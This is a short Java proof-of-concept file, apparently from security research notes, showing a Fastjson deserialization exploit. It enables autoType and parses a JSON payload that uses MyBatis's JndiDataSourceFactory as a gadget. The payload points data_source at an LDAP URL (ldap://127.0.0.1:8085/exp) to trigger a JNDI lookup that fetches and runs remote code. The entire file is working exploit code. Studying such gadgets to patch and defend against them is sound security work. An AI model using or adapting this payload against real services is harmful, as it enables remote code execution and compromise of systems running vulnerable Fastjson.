import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/*
* JndiDataSourceFactory类是mybatis依赖中的类，所以要添加mybatis环境，这里使用3.5.13
*
* */
public class FastJson_JndiDataSourceFactory {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://127.0.0.1:8085/exp\"}}";
        JSON.parse(payload);
    }
}
